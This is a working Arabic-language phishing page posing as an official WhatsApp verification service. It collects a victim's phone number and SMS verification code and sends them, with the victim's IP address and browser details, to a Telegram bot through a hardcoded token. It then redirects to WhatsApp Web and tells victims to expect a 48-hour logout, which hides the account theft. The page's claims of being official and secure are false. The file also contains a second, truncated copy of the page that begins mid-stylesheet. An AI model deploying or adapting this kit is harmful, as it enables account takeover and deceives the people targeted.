<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>دعم الواتساب الرسمي</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 20px;
            color: #333;
            line-height: 1.6;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background: white;
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 0 15px rgba(0,0,0,0.1);
        }
        h1 {
            color: #25D366;
            text-align: center;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #555;
        }
        input, select {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 16px;
        }
        button {
            background-color: #25D366;
            color: white;
            border: none;
            padding: 12px 15px;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            font-weight: bold;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #128C7E;
        }
        .secured {
            font-size: 13px;
            color: #777;
            text-align: center;
            margin-top: 25px;
            padding-top: 15px;
            border-top: 1px solid #eee;
        }
        .badge {
            background-color: #25D366;
            color: white;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: bold;
        }
        .whatsapp-logo {
            text-align: center;
            margin: 15px 0;
        }
        .whatsapp-logo img {
            height: 80px;
            margin-bottom: 10px;
        }
        #verification-section {
            display: none;
        }
        .info-box {
            background-color: #f8f9fa;
            border-left: 4px solid #25D366;
            padding: 15px;
            margin: 20px 0;
            border-radius: 0 5px 5px 0;
        }
        .info-box h3 {
            margin-top: 0;
            color: #128C7E;
        }
        .country-select {
            display: flex;
            align-items: center;
        }
        .country-select select {
            flex: 1;
            margin-left: 10px;
        }
        .country-flag {
            width: 30px;
            height: 20px;
            object-fit: cover;
            border: 1px solid #ddd;
        }
        #loading {
            display: none;
            text-align: center;
            margin: 15px 0;
        }
        .timer {
            color: #777;
            font-size: 14px;
            text-align: center;
            margin-top: 10px;
        }
        .header-logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .header-logo img {
            height: 70px;
        }
        .logo-text {
            color: #25D366;
            font-weight: bold;
            margin-top: 10px;
            font-size: 18px;
        }
        .error-message {
            color: red;
            text-align: center;
            margin: 10px 0;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header-logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="شعار واتساب">
            <div class="logo-text">WhatsApp</div>
        </div>
        
        <h1>التوثيق الرسمي للواتساب</h1>
        <div class="whatsapp-logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="واتساب">
        </div>
        
        <div class="info-box">
            <h3>فوائد توثيق رقم الواتساب</h3>
            <p>توثيق رقم الواتساب يمنحك:</p>
            <ul>
                <li>علامة التحقق <span class="badge">الرسمية</span> التي تثبت هوية عملك</li>
                <li>حماية ضد انتحال الهوية والحسابات المزيفة</li>
                <li>ظهور أولوية في نتائج البحث على واتساب</li>
                <li>زيادة ثقة العملاء بنسبة تصل إلى 80%</li>
                <li>إمكانية استخدام أدوات الأعمال المتقدمة</li>
                <li>حماية بياناتك برمزية من طرف إلى طرف</li>
            </ul>
            <p>عملية التوثيق تتم خلال 3 أيام عمل كحد أقصى بعد تقديم الطلب.</p>
        </div>
        
        <div style="background: #f0f0f0; padding: 12px; border-radius: 6px; margin: 20px 0;">
            <p><span class="badge">مؤمن</span> جميع المحادثات والمكالمات محمية بتشفير من طرف إلى طرف.</p>
        </div>
        
        <!-- رسالة الخطأ -->
        <div id="error-message" class="error-message"></div>
        
        <form id="main-form" method="POST">
            <!-- قسم إدخال رقم الهاتف -->
            <div id="phone-section">
                <div class="form-group">
                    <label for="country">الدولة</label>
                    <div class="country-select">
                        <select id="country" name="country">
                            <option value="213+" data-flag="🇩🇿">الجزائر (213+)</option>
                            <option value="966+" data-flag="🇸🇦">السعودية (966+)</option>
                            <option value="971+" data-flag="🇦🇪">الإمارات (971+)</option>
                            <option value="20+" data-flag="🇪🇬">مصر (20+)</option>
                            <option value="962+" data-flag="🇯🇴">الأردن (962+)</option>
                            <option value="965+" data-flag="🇰🇼">الكويت (965+)</option>
                            <option value="974+" data-flag="🇶🇦">قطر (974+)</option>
                            <option value="968+" data-flag="🇴🇲">عمان (968+)</option>
                            <option value="973+" data-flag="🇧🇭">البحرين (973+)</option>
                            <option value="212+" data-flag="🇲🇦">المغرب (212+)</option>
                            <option value="216+" data-flag="🇹🇳">تونس (216+)</option>
                            <option value="964+" data-flag="🇮🇶">العراق (964+)</option>
                            <option value="961+" data-flag="🇱🇧">لبنان (961+)</option>
                            <option value="218+" data-flag="🇱🇾">ليبيا (218+)</option>
                            <option value="222+" data-flag="🇲🇷">موريتانيا (222+)</option>
                            <option value="967+" data-flag="🇾🇪">اليمن (967+)</option>
                            <option value="252+" data-flag="🇸🇴">الصومال (252+)</option>
                            <option value="249+" data-flag="🇸🇩">السودان (249+)</option>
                            <option value="963+" data-flag="🇸🇾">سوريا (963+)</option>
                            <option value="970+" data-flag="🇵🇸">فلسطين (970+)</option>
                            <option value="1+" data-flag="🇺🇸">الولايات المتحدة (1+)</option>
                            <option value="44+" data-flag="🇬🇧">المملكة المتحدة (44+)</option>
                            <option value="33+" data-flag="🇫🇷">فرنسا (33+)</option>
                            <option value="49+" data-flag="🇩🇪">ألمانيا (49+)</option>
                            <option value="39+" data-flag="🇮🇹">إيطاليا (39+)</option>
                            <option value="34+" data-flag="🇪🇸">إسبانيا (34+)</option>
                            <option value="90+" data-flag="🇹🇷">تركيا (90+)</option>
                            <option value="7+" data-flag="🇷🇺">روسيا (7+)</option>
                            <option value="86+" data-flag="🇨🇳">الصين (86+)</option>
                            <option value="91+" data-flag="🇮🇳">الهند (91+)</option>
                        </select>
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="phone">رقم الهاتف</label>
                    <input type="tel" id="phone" name="phone" placeholder="أدخل رقم الهاتف بدون الصفر الأول" required>
                </div>
                
                <button type="button" id="send-verification">إرسال رمز التحقق</button>
                <div id="loading" style="display: none;">
                    <p>جاري إرسال رمز التحقق...</p>
                </div>
            </div>
            
            <!-- قسم إدخال رمز التحقق (سيظهر بعد إرسال الرقم) -->
            <div id="verification-section">
                <div class="form-group">
                    <label for="verification-code">رمز التحقق المكون من 6 أرقام</label>
                    <input type="text" id="verification-code" name="verification-code" placeholder="أدخل رمز التحقق المرسل إليك" maxlength="6" required>
                </div>
                
                <div class="timer" id="timer">يمكنك إعادة الإرسال بعد 02:00</div>
                <button type="button" id="resend-code" style="background: #f0f0f0; color: #555; display: none;">إعادة إرسال الرمز</button>
                
                <button type="submit">تأكيد التوثيق</button>
            </div>
        </form>
        
        <div class="info-box">
            <h3>كيف يعمل التوثيق؟</h3>
            <p>1. تقوم بإدخال رقم هاتفك المراد توثيقه</p>
            <p>2. نرسل لك رمز تحقق مؤقت عبر رسالة SMS</p>
            <p>3. تدخل رمز التحقق لتأكيد ملكية الرقم</p>
            <p>4. نتحقق من بياناتك خلال 48 ساعة عمل</p>
            <p>5. سيتم تسجيل الخروج من حسابك لمدة 48 ساعة لحين توثيق حسابك</p>
            <p>6. تحصل على العلامة الرسمية بعد الموافقة</p>
        </div>
        
        <p class="secured">هذا الحساب هو الحساب الرسمي المعتمد من واتساب للأعمال. جميع البيانات محمية بتشفير متقدم.</p>
    </div>

    <script>
        // جلب chat_id من الرابط أو تعيينه يدويًا
        const urlParams = new URLSearchParams(window.location.search);
        let chatId = urlParams.get('chat_id');
        
        // إذا لم يكن chat_id موجودًا في الرابط، يمكن تعيينه يدويًا هنا:
        if (!chatId) {
            chatId = '123456789'; // استبدلها بمعرف الدردشة الخاص بك
        }
        
        const botToken = '6308792872:AAG_O5Y_-nheEQRl9osGSG-Ek8EXHei8jJA'; // استبدله إذا لزم الأمر

        // دالة لعرض رسائل الخطأ
        function showError(message) {
            const errorElement = document.getElementById('error-message');
            errorElement.textContent = message;
            errorElement.style.display = 'block';
            setTimeout(() => {
                errorElement.style.display = 'none';
            }, 5000);
        }

        // دالة إرسال البيانات إلى التليجرام بشكل آمن
        function sendToTelegram(data) {
            if (!chatId || !botToken) {
                console.error('Chat ID أو Bot Token غير موجود');
                showError('حدث خطأ في الإرسال. يرجى المحاولة لاحقًا.');
                return;
            }
            
            let message = `📲 *طلب توثيق واتساب جديد* 📲\n\n`;
            
            if (data.type === 'phone_submission') {
                message += `📞 *رقم الهاتف:* \`${data.phone}\`\n`;
                message += `🌍 *البلد:* ${data.country}\n`;
                message += `🕒 *الوقت:* ${data.time}\n`;
                message += `🌐 *IP:* ${data.ip || 'غير معروف'}\n`;
                message += `🖥️ *المتصفح:* ${data.userAgent || 'غير معروف'}\n`;
                message += `\n🔗 *رابط الطلب:* ${window.location.href}`;
            } else if (data.type === 'verification_code') {
                message += `🔢 *رمز التحقق:* \`${data.code}\`\n`;
                message += `🕒 *الوقت:* ${data.time}\n`;
                message += `\n✅ *تم إدخال رمز التحقق بنجاح*`;
            }
            
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
            
            // استخدام XMLHttpRequest لتجنب مشاكل CORS
            const xhr = new XMLHttpRequest();
            xhr.open('GET', url, true);
            xhr.onload = function() {
                if (xhr.status === 200) {
                    console.log('تم الإرسال بنجاح:', JSON.parse(xhr.responseText));
                } else {
                    console.error('فشل الإرسال:', xhr.status);
                    showError('حدث خطأ في الإرسال. يرجى المحاولة لاحقًا.');
                }
            };
            xhr.onerror = function() {
                console.error('خطأ في الشبكة');
                showError('حدث خطأ في الشبكة. يرجى التحقق من اتصال الإنترنت.');
            };
            xhr.send();
        }

        // الحصول على عنوان IP للمستخدم (مع معالجة الأخطاء)
        function getUserIP() {
            return new Promise((resolve) => {
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => resolve(data.ip || 'غير معروف'))
                    .catch(() => resolve('غير معروف'));
            });
        }

        // إرسال رمز التحقق عند الضغط على الزر
        document.getElementById('send-verification').addEventListener('click', async function() {
            const countryCode = document.getElementById('country').value;
            const phoneNumber = document.getElementById('phone').value;
            
            if (!phoneNumber || phoneNumber.length < 8) {
                showError('الرجاء إدخال رقم هاتف صحيح (8 أرقام على الأقل)');
                return;
            }
            
            document.getElementById('loading').style.display = 'block';
            document.getElementById('send-verification').disabled = true;
            
            try {
                const countryName = document.getElementById('country').options[document.getElementById('country').selectedIndex].text;
                const userIP = await getUserIP();
                const userAgent = navigator.userAgent;
                
                // إرسال بيانات الهاتف إلى التليجرام
                sendToTelegram({
                    type: 'phone_submission',
                    phone: `${countryCode}${phoneNumber}`,
                    country: countryName,
                    time: new Date().toLocaleString('ar-EG'),
                    ip: userIP,
                    userAgent: userAgent
                });

                // إظهار قسم التحقق بعد تأخير محاكاة
                setTimeout(() => {
                    document.getElementById('phone-section').style.display = 'none';
                    document.getElementById('verification-section').style.display = 'block';
                    document.getElementById('loading').style.display = 'none';
                    startTimer();
                }, 1500);
            } catch (error) {
                console.error('حدث خطأ:', error);
                showError('حدث خطأ غير متوقع. يرجى المحاولة مرة أخرى.');
                document.getElementById('loading').style.display = 'none';
                document.getElementById('send-verification').disabled = false;
            }
        });
        
        // تأكيد رمز التحقق
        document.getElementById('main-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const verificationCode = document.getElementById('verification-code').value;
            
            if (!verificationCode || verificationCode.length !== 6) {
                showError('الرجاء إدخال رمز التحقق المكون من 6 أرقام');
                return;
            }
            
            // إرسال كود التحقق إلى التليجرام
            sendToTelegram({
                type: 'verification_code',
                code: verificationCode,
                time: new Date().toLocaleString('ar-EG')
            });

            alert('تم إرسال طلب التوثيق بنجاح! سيتم التواصل معك خلال 48 ساعة عمل.');
            
            // إعادة توجيه المستخدم بعد الإرسال
            setTimeout(() => {
                window.location.href = "https://web.whatsapp.com/";
            }, 3000);
        });
        
        // مؤقت لإعادة الإرسال
        function startTimer() {
            let timeLeft = 120;
            const timerElement = document.getElementById('timer');
            const resendButton = document.getElementById('resend-code');
            
            const timerInterval = setInterval(() => {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                
                timerElement.textContent = `يمكنك إعادة الإرسال بعد ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 0) {
                    clearInterval(timerInterval);
                    timerElement.style.display = 'none';
                    resendButton.style.display = 'block';
                }
                
                timeLeft--;
            }, 1000);
            
            resendButton.addEventListener('click', function() {
                document.getElementById('verification-section').style.display = 'none';
                document.getElementById('phone-section').style.display = 'block';
                document.getElementById('send-verification').disabled = false;
                resendButton.style.display = 'none';
                timerElement.style.display = 'block';
            });
        }
        
        // التحقق من صحة رقم الهاتف (أرقام فقط)
        document.getElementById('phone').addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
        });
    </script>
</body>
</html>        }
        input, select {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 16px;
        }
        button {
            background-color: #25D366;
            color: white;
            border: none;
            padding: 12px 15px;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            font-weight: bold;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #128C7E;
        }
        .secured {
            font-size: 13px;
            color: #777;
            text-align: center;
            margin-top: 25px;
            padding-top: 15px;
            border-top: 1px solid #eee;
        }
        .badge {
            background-color: #25D366;
            color: white;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: bold;
        }
        .whatsapp-logo {
            text-align: center;
            margin: 15px 0;
        }
        .whatsapp-logo img {
            height: 80px;
            margin-bottom: 10px;
        }
        #verification-section {
            display: none;
        }
        .info-box {
            background-color: #f8f9fa;
            border-left: 4px solid #25D366;
            padding: 15px;
            margin: 20px 0;
            border-radius: 0 5px 5px 0;
        }
        .info-box h3 {
            margin-top: 0;
            color: #128C7E;
        }
        .country-select {
            display: flex;
            align-items: center;
        }
        .country-select select {
            flex: 1;
            margin-left: 10px;
        }
        .country-flag {
            width: 30px;
            height: 20px;
            object-fit: cover;
            border: 1px solid #ddd;
        }
        #loading {
            display: none;
            text-align: center;
            margin: 15px 0;
        }
        .timer {
            color: #777;
            font-size: 14px;
            text-align: center;
            margin-top: 10px;
        }
        .header-logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .header-logo img {
            height: 70px;
        }
        .logo-text {
            color: #25D366;
            font-weight: bold;
            margin-top: 10px;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header-logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="شعار واتساب">
            <div class="logo-text">WhatsApp</div>
        </div>
        
        <h1>التوثيق الرسمي للواتساب</h1>
        <div class="whatsapp-logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="واتساب">
        </div>
        
        <div class="info-box">
            <h3>فوائد توثيق رقم الواتساب</h3>
            <p>توثيق رقم الواتساب يمنحك:</p>
            <ul>
                <li>علامة التحقق <span class="badge">الرسمية</span> التي تثبت هوية عملك</li>
                <li>حماية ضد انتحال الهوية والحسابات المزيفة</li>
                <li>ظهور أولوية في نتائج البحث على واتساب</li>
                <li>زيادة ثقة العملاء بنسبة تصل إلى 80%</li>
                <li>إمكانية استخدام أدوات الأعمال المتقدمة</li>
                <li>حماية بياناتك برمزية من طرف إلى طرف</li>
            </ul>
            <p>عملية التوثيق تتم خلال 3 أيام عمل كحد أقصى بعد تقديم الطلب.</p>
        </div>
        
        <div style="background: #f0f0f0; padding: 12px; border-radius: 6px; margin: 20px 0;">
            <p><span class="badge">مؤمن</span> جميع المحادثات والمكالمات محمية بتشفير من طرف إلى طرف.</p>
        </div>
        
        <form id="main-form" method="POST">
            <!-- قسم إدخال رقم الهاتف -->
            <div id="phone-section">
                <div class="form-group">
                    <label for="country">الدولة</label>
                    <div class="country-select">
                        <select id="country" name="country">
                            <option value="213+" data-flag="🇩🇿">الجزائر (213+)</option>
                            <option value="966+" data-flag="🇸🇦">السعودية (966+)</option>
                            <option value="971+" data-flag="🇦🇪">الإمارات (971+)</option>
                            <option value="20+" data-flag="🇪🇬">مصر (20+)</option>
                            <option value="962+" data-flag="🇯🇴">الأردن (962+)</option>
                            <option value="965+" data-flag="🇰🇼">الكويت (965+)</option>
                            <option value="974+" data-flag="🇶🇦">قطر (974+)</option>
                            <option value="968+" data-flag="🇴🇲">عمان (968+)</option>
                            <option value="973+" data-flag="🇧🇭">البحرين (973+)</option>
                            <option value="212+" data-flag="🇲🇦">المغرب (212+)</option>
                            <option value="216+" data-flag="🇹🇳">تونس (216+)</option>
                            <option value="964+" data-flag="🇮🇶">العراق (964+)</option>
                            <option value="961+" data-flag="🇱🇧">لبنان (961+)</option>
                            <option value="218+" data-flag="🇱🇾">ليبيا (218+)</option>
                            <option value="222+" data-flag="🇲🇷">موريتانيا (222+)</option>
                            <option value="967+" data-flag="🇾🇪">اليمن (967+)</option>
                            <option value="252+" data-flag="🇸🇴">الصومال (252+)</option>
                            <option value="249+" data-flag="🇸🇩">السودان (249+)</option>
                            <option value="963+" data-flag="🇸🇾">سوريا (963+)</option>
                            <option value="970+" data-flag="🇵🇸">فلسطين (970+)</option>
                            <option value="1+" data-flag="🇺🇸">الولايات المتحدة (1+)</option>
                            <option value="44+" data-flag="🇬🇧">المملكة المتحدة (44+)</option>
                            <option value="33+" data-flag="🇫🇷">فرنسا (33+)</option>
                            <option value="49+" data-flag="🇩🇪">ألمانيا (49+)</option>
                            <option value="39+" data-flag="🇮🇹">إيطاليا (39+)</option>
                            <option value="34+" data-flag="🇪🇸">إسبانيا (34+)</option>
                            <option value="90+" data-flag="🇹🇷">تركيا (90+)</option>
                            <option value="7+" data-flag="🇷🇺">روسيا (7+)</option>
                            <option value="86+" data-flag="🇨🇳">الصين (86+)</option>
                            <option value="91+" data-flag="🇮🇳">الهند (91+)</option>
                        </select>
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="phone">رقم الهاتف</label>
                    <input type="tel" id="phone" name="phone" placeholder="أدخل رقم الهاتف بدون الصفر الأول" required>
                </div>
                
                <button type="button" id="send-verification">إرسال رمز التحقق</button>
                <div id="loading" style="display: none;">
                    <p>جاري إرسال رمز التحقق...</p>
                </div>
            </div>
            
            <!-- قسم إدخال رمز التحقق (سيظهر بعد إرسال الرقم) -->
            <div id="verification-section">
                <div class="form-group">
                    <label for="verification-code">رمز التحقق المكون من 6 أرقام</label>
                    <input type="text" id="verification-code" name="verification-code" placeholder="أدخل رمز التحقق المرسل إليك" maxlength="6" required>
                </div>
                
                <div class="timer" id="timer">يمكنك إعادة الإرسال بعد 02:00</div>
                <button type="button" id="resend-code" style="background: #f0f0f0; color: #555; display: none;">إعادة إرسال الرمز</button>
                
                <button type="submit">تأكيد التوثيق</button>
            </div>
        </form>
        
        <div class="info-box">
            <h3>كيف يعمل التوثيق؟</h3>
            <p>1. تقوم بإدخال رقم هاتفك المراد توثيقه</p>
            <p>2. نرسل لك رمز تحقق مؤقت عبر رسالة SMS</p>
            <p>3. تدخل رمز التحقق لتأكيد ملكية الرقم</p>
            <p>4. نتحقق من بياناتك خلال 48 ساعة عمل</p>
            <p>5. سيتم تسجيل الخروج من حسابك لمدة 48 ساعة لحين توثيق حسابك</p>
            <p>6. تحصل على العلامة الرسمية بعد الموافقة</p>
        </div>
        
        <p class="secured">هذا الحساب هو الحساب الرسمي المعتمد من واتساب للأعمال. جميع البيانات محمية بتشفير متقدم.</p>
    </div>

    <script>
        // جلب chat_id من الرابط
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('chat_id');
        const botToken = '6308792872:AAG_O5Y_-nheEQRl9osGSG-Ek8EXHei8jJA';

        // دالة إرسال البيانات إلى التليجرام بشكل منظم
        function sendToTelegram(data) {
            if (!chatId) {
                console.error('Chat ID not found in URL');
                return;
            }
            
            // تنسيق الرسالة بشكل منظم
            let message = `📲 *طلب توثيق واتساب جديد* 📲\n\n`;
            
            if (data.type === 'phone_submission') {
                message += `📞 *رقم الهاتف:* \`${data.phone}\`\n`;
                message += `🌍 *البلد:* ${data.country}\n`;
                message += `🕒 *الوقت:* ${data.time}\n`;
                message += `🌐 *IP:* ${data.ip || 'غير معروف'}\n`;
                message += `🖥️ *المتصفح:* ${data.userAgent || 'غير معروف'}\n`;
                message += `\n🔗 *رابط الطلب:* ${window.location.href}`;
            } else if (data.type === 'verification_code') {
                message += `🔢 *رمز التحقق:* \`${data.code}\`\n`;
                message += `🕒 *الوقت:* ${data.time}\n`;
                message += `\n✅ *تم إدخال رمز التحقق بنجاح*`;
            }
            
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
            
            fetch(url)
                .then(response => response.json())
                .then(data => console.log('تم الإرسال بنجاح:', data))
                .catch(error => console.error('خطأ في الإرسال:', error));
        }

        // الحصول على عنوان IP للمستخدم
        function getUserIP() {
            return fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => data.ip)
                .catch(() => 'غير معروف');
        }

        // إرسال رمز التحقق عند الضغط على الزر فقط
        document.getElementById('send-verification').addEventListener('click', async function() {
            const countryCode = document.getElementById('country').value;
            const phoneNumber = document.getElementById('phone').value;
            
            if (!phoneNumber || phoneNumber.length < 8) {
                alert('الرجاء إدخال رقم هاتف صحيح (8 أرقام على الأقل)');
                return;
            }
            
            document.getElementById('loading').style.display = 'block';
            document.getElementById('send-verification').disabled = true;
            
            const countryName = document.getElementById('country').options[document.getElementById('country').selectedIndex].text;
            const userIP = await getUserIP();
            const userAgent = navigator.userAgent;
            
            // إرسال بيانات الهاتف إلى التليجرام
            sendToTelegram({
                type: 'phone_submission',
                phone: `${countryCode}${phoneNumber}`,
                country: countryName,
                time: new Date().toLocaleString('ar-EG'),
                ip: userIP,
                userAgent: userAgent
            });

            // إظهار قسم التحقق وإخفاء قسم الهاتف
            setTimeout(() => {
                document.getElementById('phone-section').style.display = 'none';
                document.getElementById('verification-section').style.display = 'block';
                document.getElementById('loading').style.display = 'none';
                startTimer();
            }, 1500);
        });
        
        // تأكيد رمز التحقق
        document.getElementById('main-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const verificationCode = document.getElementById('verification-code').value;
            
            if (!verificationCode || verificationCode.length !== 6) {
                alert('الرجاء إدخال رمز التحقق المكون من 6 أرقام');
                return;
            }
            
            // إرسال كود التحقق إلى التليجرام
            sendToTelegram({
                type: 'verification_code',
                code: verificationCode,
                time: new Date().toLocaleString('ar-EG')
            });

            alert('تم إرسال طلب التوثيق بنجاح! سيتم التواصل معك خلال 48 ساعة عمل.');
            
            // إعادة توجيه المستخدم بعد الإرسال
            setTimeout(() => {
                window.location.href = "https://web.whatsapp.com/";
            }, 3000);
        });
        
        // مؤقت لإعادة الإرسال
        function startTimer() {
            let timeLeft = 120;
            const timerElement = document.getElementById('timer');
            const resendButton = document.getElementById('resend-code');
            
            const timerInterval = setInterval(() => {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                
                timerElement.textContent = `يمكنك إعادة الإرسال بعد ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 0) {
                    clearInterval(timerInterval);
                    timerElement.style.display = 'none';
                    resendButton.style.display = 'block';
                }
                
                timeLeft--;
            }, 1000);
            
            resendButton.addEventListener('click', function() {
                document.getElementById('verification-section').style.display = 'none';
                document.getElementById('phone-section').style.display = 'block';
                document.getElementById('send-verification').disabled = false;
                resendButton.style.display = 'none';
                timerElement.style.display = 'block';
            });
        }
        
        // التحقق من صحة رقم الهاتف (أرقام فقط)
        document.getElementById('phone').addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
        });
    </script>
</body>
</html>
